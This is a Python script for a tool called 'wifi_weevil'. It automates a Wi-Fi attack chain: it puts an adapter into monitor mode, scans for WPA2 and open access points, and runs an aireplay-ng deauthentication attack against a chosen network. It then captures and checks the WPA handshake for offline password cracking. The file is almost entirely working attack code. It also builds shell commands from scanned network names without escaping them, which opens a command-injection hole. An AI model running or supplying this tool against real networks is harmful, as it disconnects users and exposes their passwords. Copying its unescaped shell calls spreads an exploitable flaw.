from subprocess import *
import signal
import os
from ansi.colour import fg, bg
from ansi.colour.fx import reset
from time import sleep
from time import time
import getopt, sys
import random
import string
import math
import pandas
from halo import Halo
import numpy as np

### GLOBAL VARIABLES ###

this_dir = (os.path.split(os.path.realpath(__file__))[0])
weevil_version = '0.0.2'

adap_pref = ""

my_selection = {
    "my_adapter":None,
    'my_bssid':None,
    'my_essid':None,
    'my_channel':None,
}

base_t = 8

#---#

# authenticate
def authenticate():
    call([f'sudo echo "wifi_weevil (v{weevil_version})"'],shell=True)

# help text
def usage():
    print(f"{str(reset)}{fg.green}\nwifi_weevil (v {weevil_version}){str(reset)}")
    print(f"{fg.blue}by antievil\n{str(reset)}")
    print(f"-h, --help")
    print(f"-s, --start : begin wifi weevil")
    print(f"-t, --time : time in seconds to search for access points")
    print(f"-r, --reconnect : stop airmon-ng and restart network connections if lost")
    print(str(reset))

# clear screen
def clr():
    import os
    clear = lambda: os.system('clear')
    clear()

# print name of app
def tl():
    clr()
    print(fg.green + bg.black + "[... wifi weevil ...]" + str(reset) + "\n")

#---#

### SEQUENTIAL FUNCTIONS ###

# stop monitor mode of adapter
def stop_mon():

    # get correct adapter name
    cmd = r"ip -o link show | awk -F': ' '{print $2}'"
    adapters = check_output([cmd],shell=True).decode().split('\n')
    adapters.pop()
    adapters.pop(0)
    this_adap=None
    for adap in adapters:
        if "mon" in adap:
            this_adap=adap # change prefix to shortened
    try:
        check_output([f"sudo airmon-ng stop {this_adap}"],shell=True)
    except Exception as e:
        pass # already closed

# helper function
def sh(cmd):
    return check_output(cmd).decode().strip()

# choose adapter
def select_adapter():

    # stop all monitoring adapters first
    stop_mon()
    sleep(1)

    tl()

    # print and store all adapters
    cmd = r"ip -o link show | awk -F': ' '{print $2}'"
    out = check_output([cmd],shell=True)
    adapters = check_output([cmd],shell=True).decode().split('\n')
    adapters.pop()
    adapters.pop(0)
    out = out.decode().replace('lo\n','')
    out = '\n' + out
    for i in range(out.count('\n')-1):
        out = out.replace('\n',f'^n${fg.blue}[{i}]{str(reset)} ',1)
    out = out.replace("^n$",'\n')
    if(len(adapters)==0):
        # if none are found, exit
        print(fg.boldred + 'No adapters found!\n' + str(reset))
        stop_mon()
        sys.exit()
    print(fg.boldblue + 'Select the index of your adapter below' + str(reset))
    print(out)

    # request number of adapter
    n = None
    f = False
    usr = ""
    while((not isinstance(n,int) or (n < 0 or n > len(adapters)-1)) and not usr=="exit"):
        print(fg.blue + '$' + str(reset),end=' ')
        usr = input()
        try:
            n = int(usr)
        except ValueError:
            n = None
        if(not isinstance(n,int) or (n < 0 or n > len(adapters)-1)):
            if not f:
                f = True
                print()
            print('\033[F\033[K', end='')
            print('\033[F\033[K', end='')
            if usr != "exit":
                print(fg.boldblue + f"Invalid option! Expected an index from {0} to {len(adapters)-1}" + str(reset))

    if(usr=="exit"):
        stop_mon()
        sys.exit()

    # store adapter
    global my_selection, adap_pref
    adap_pref = adapters[n] # set prefix to current adapter
    my_selection['my_adapter'] = adapters[n]

# put adapter in monitor mode, get aps
def start_monitor():
    tl()
    global my_selection, adap_pref

    # monitor mode
    print(f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Place adapter into monitor mode' + str(reset))
    check_output([f"sudo airmon-ng start {my_selection['my_adapter']}"],shell=True)
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Place adapter into monitor mode' + str(reset) + '\n')

    # try many times if needed
    gottenAPs = False
    attempts = 0

    # check for shortened adapter name
    sleep(1)
    cmd = r"ip -o link show | awk -F': ' '{print $2}'"
    adapters = check_output([cmd],shell=True).decode().split('\n')
    adapters.pop()
    adapters.pop(0)
    for adap in adapters:
        if "wlan0mon" in adap:
            adap_pref="wlan0" # change prefix to shortened

    while(not gottenAPs and attempts < 3):

        # get aps
        spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Search for access points{str(reset)}', spinner='line', color="white")
        spinner.start()

        # clear temp folder
        try:
            run([f"sudo rm {this_dir}/temp/aps-*.*"],shell=True,stdout=DEVNULL, stderr=DEVNULL)
        except Exception as e:
            pass # empty temp folder

        # output aps to csv
        qterm = Popen([f'sudo airodump-ng {adap_pref}mon -w {this_dir}/temp/aps --output-format csv'],
        shell=True,stdout=DEVNULL,stderr=DEVNULL,preexec_fn=os.setpgrp)

        sleep(base_t + attempts*2)
        spinner.stop_and_persist()

        # stop getting aps
        os.killpg(os.getpgid(qterm.pid), signal.SIGINT)

        # validate aps
        try:
            df_tmp = pandas.read_csv(f"{this_dir}/temp/aps-01.csv")
            tmp_bssids = df_tmp['BSSID'][0]
            # success
            gottenAPs = True
            continue
        except Exception as e:
            # failure, try again
            attempts += 1
            print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Search for access points | Searching again...\n' + str(reset))
            continue
    
    # timed out, could not get aps
    if(not gottenAPs):
        print(f'{str(reset)}{fg.boldred}TIMED OUT!')
        print(f'{str(reset)}{fg.boldblue}Are you using the correct kernel version?{str(reset)}',end=' ')
        run(['uname -r'],shell=True)
        print(f'{str(reset)}{fg.boldblue}Try increasing the time parameter in settings.\n')
        stop_mon()
        sys.exit()

    # aps possibly found, read aps
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Search for access points\n' + str(reset))
    df = pandas.read_csv(f"{this_dir}/temp/aps-01.csv")

    all_aps = {
        'bssids':(df['BSSID']),
        'essids':(df[' ESSID']),
        'channels':(df[' channel']),
        'powers':(df[' Power']),
        'privs':(df[' Privacy'])
    }

    filtered_aps = {
        'fltr_bssids':[],
        'fltr_essids':[],
        'fltr_channels':[],
        'fltr_powers':[],
        'fltr_privs':[]
    }

    # filter aps
    for i in range(len(all_aps['bssids'])):
        if(len(all_aps['bssids'][i]) <= 1 or "Station" in all_aps['bssids'][i]):
            break
        if('WPA2' in all_aps['privs'][i] or 'OPN' in all_aps['privs'][i]):
            filtered_aps['fltr_bssids'].append(all_aps['bssids'][i])
            filtered_aps['fltr_essids'].append(all_aps['essids'][i][1:])
            filtered_aps['fltr_channels'].append("".join(all_aps['channels'][i].split()))
            filtered_aps['fltr_powers'].append(int(all_aps['powers'][i]))
            filtered_aps['fltr_privs'].append(all_aps['privs'][i][1:])

    # sort filtered_aps
    idx = list(reversed(np.argsort(filtered_aps['fltr_powers'])))
    for key in filtered_aps:
        filtered_aps[key] = np.array(filtered_aps[key])[idx]

    # verify aps
    if(len(filtered_aps['fltr_bssids']) < 1):
        # no aps found
        print(f'{str(reset)}{fg.boldred}SEARCHED, BUT NO ACCESS POINTS FOUND!')
        print(f'{str(reset)}{fg.boldblue}Are you using the correct kernel version?{str(reset)}',end=' ')
        run(['uname -r'],shell=True)
        print(f'{str(reset)}{fg.boldblue}Try increasing the time parameter in settings.\n')
        stop_mon()
        sys.exit()
    
    print(fg.boldblue + 'Select the index of an access point below\n' + str(reset))

    # print aps
    for i in range(len(filtered_aps['fltr_bssids'])):
        fei = filtered_aps['fltr_essids'][i]
        if len(fei) == 0:
            fei = "unknown"
        print(f"{fg.blue}[{i}]{str(reset)} {filtered_aps['fltr_bssids'][i]} ({fei}) (ch {filtered_aps['fltr_channels'][i]}){fg.grey} ({str(filtered_aps['fltr_powers'][i])} dbm) ({filtered_aps['fltr_privs'][i]})")
    print()

    # specify ap from user
    n = None
    f = False
    usr = ""
    while((not isinstance(n,int) or (n < 0 or n > len(filtered_aps['fltr_bssids'])-1)) and not usr=="exit"):
        print(fg.blue + '$' + str(reset),end=' ')
        usr = input()
        try:
            n = int(usr)
        except ValueError:
            n = None
        if(not isinstance(n,int) or (n < 0 or n > len(filtered_aps['fltr_bssids'])-1)):
            if not f:
                f = True
                print()
            print('\033[F\033[K', end='')
            print('\033[F\033[K', end='')
            if usr != "exit":
                print(fg.boldblue + f"Invalid option! Expected an index from {0} to {len(filtered_aps['fltr_bssids'])-1}" + str(reset))
    
    if(usr=="exit"):
        stop_mon()
        sys.exit()

    # store ap
    my_selection['my_bssid'] = filtered_aps['fltr_bssids'][n]
    my_fei = filtered_aps['fltr_essids'][n]
    if len(my_fei) == 0:
            my_fei = "unknown"
    my_selection['my_essid'] = my_fei

    # store channel
    my_selection['my_channel'] = int(filtered_aps['fltr_channels'][n])

# get handshake from bssid using deauth attack
def get_handshake():
    tl()

    # display selected ap
    global my_selection
    print(f'{str(reset)}',end='')
    print(f'{fg.boldblue}Selected{str(reset)} {my_selection['my_bssid']} ({my_selection['my_essid']}) (channel {my_selection['my_channel']})\n')

    # create new dir
    rs = my_selection['my_essid'] + '_' + str(round(time()))
    #rs = my_selection['my_essid'] + '_' + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    try:
        run([f'sudo mkdir -m 777 {this_dir}/captured/{rs}/'],shell=True)
    except Exception as e:
        pass

    # start airodump-ng
    spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Prepare deauth attack on AP{str(reset)}', spinner='line', color="white")
    spinner.start()
    qterm_A = Popen([f'sudo airodump-ng -c {str(my_selection['my_channel'])} --bssid {str(my_selection['my_bssid'])} -w {this_dir}/captured/{rs}/hand {adap_pref}mon'],
    shell=True,stdout=DEVNULL,stderr=DEVNULL,preexec_fn=os.setpgrp)
    sleep(10) #4
    spinner.stop_and_persist()
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Prepare deauth attack on AP\n' + str(reset))

    # send deauth frame
    spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Execute deauth attack on AP to capture handshake{str(reset)}', spinner='line', color="white")
    spinner.start()
    try:
        check_output([f"sudo aireplay-ng -0 1 -a {str(my_selection['my_bssid'])} {adap_pref}mon --ignore-negative-one"],shell=True)
        spinner.stop_and_persist()
    except Exception as e:
        # could not exec deauth attack
        spinner.stop_and_persist()
        print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Execute deauth attack on AP to capture handshake' + str(reset) + '\n')
        print(fg.boldred + 'DEAUTH FAILED!')
        print(fg.boldblue + 'Try moving closer to the access point.\n')
        stop_mon()
        sys.exit()
        
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Execute deauth attack on AP to capture handshake' + str(reset) + '\n')
    
    # wait cap
    spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Wait for handshake and verify{str(reset)}', spinner='line', color="white")
    spinner.start()
    sleep(8) #8
    os.killpg(qterm_A.pid, signal.SIGINT)

    # verify cap
    cap_data = str(check_output([f'aircrack-ng {this_dir}/captured/{rs}/hand-01.cap'],shell=True))
    hand_count = -1
    try:
        hand_index = cap_data.index('WPA (')+5
        hand_count = int(cap_data[hand_index:hand_index+1])
    except Exception as e:
        pass # unknown encryption, could not get handshake
    if(hand_count < 1):
        # could not verify cap, bail
        spinner.stop_and_persist()
        print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Wait for handshake and verify' + str(reset) + '\n')
        print(fg.boldred + 'HANDSHAKE CAPTURE FAILED!')
        print(fg.boldblue + 'Try moving closer to the access point.\n')
        stop_mon()
        sys.exit()
    
    # export bssid to txt file
    check_output([f'echo "{my_selection['my_bssid']}" > {this_dir}/captured/{rs}/{my_selection['my_essid']}_bssid.txt'],shell=True)

    spinner.stop_and_persist()
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Wait for handshake and verify' + str(reset) + '\n')
    print(fg.boldblue + 'HANDSHAKE CAPTURE SUCCEEDED!\n' + str(reset))

    sleep(1)

    # open directory
    print(fg.boldblue + f'Exported to {str(reset)}{this_dir}/captured/{rs}/' + str(reset) + '\n')
    os.system(f'xdg-open {this_dir}/captured/{rs}/')

    # stop airmon
    stop_mon()

# follow guide to choose an adapter, begin monitoring, run a deauth attack, and capture handshake
def guide_usr():
    authenticate()
    select_adapter()
    start_monitor()
    get_handshake()

#---#

### MAIN ###

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "shrt:", ["start","help","reconnect","time="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit(2)
    output = None
    for o, a in opts:
        if o in ("-r", "--reconnect"):
            stop_mon()
            sys.exit()
        elif o in ("-s", "--start"):
            guide_usr()
            stop_mon()
            sys.exit()
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-t", "--time"):
            global base_t
            base_t = int(a)
            guide_usr()
            stop_mon()
            sys.exit()
        else:
            assert False, "unhandled option"
    if(len(opts)==0):
        guide_usr()
        stop_mon()
        sys.exit()

if __name__ == "__main__":
    main()